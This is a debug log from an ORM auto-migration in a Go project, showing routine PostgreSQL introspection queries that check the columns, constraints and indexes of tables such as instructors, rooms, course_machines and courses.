[0m[33m[0.991ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.979ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.253ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.047ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.020ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.796ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.719ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.790ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.691ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.297ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.575ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.528ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.673ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.061ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.344ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.079ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.021ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.988ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.057ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.021ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.992ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.263ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'room_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.925ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.878ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'instructor_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.684ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND constraint_name = 'fk_rooms_instructor'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.634ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'rooms' AND indexname = 'idx_rooms_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.575ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.354ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.029ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.485ms] [34;1m[rows:-][0m SELECT * FROM "course_machines" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[10.147ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.278ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.479ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'course_machines'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.272ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.735ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.966ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.728ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'title') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.395ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'description') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.053ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'point') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.113ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND column_name = 'difficulty_level_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'course_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.741ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'course_machines' AND constraint_name = 'fk_course_machines_difficulty_level'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.617ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'course_machines' AND indexname = 'idx_course_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.510ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND table_type = 'BASE TABLE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.347ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.541ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.544ms] [34;1m[rows:-][0m SELECT * FROM "courses" LIMIT 5

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.369ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[14.769ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.497ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'courses'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.029ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.087ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.969ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.037ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.046ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'content') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.078ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'room_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.070ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND column_name = 'course_machine_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'courses' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.858ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_room'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.901ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'courses' AND constraint_name = 'fk_courses_course_machine'

2025/06/09 14:07:47 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
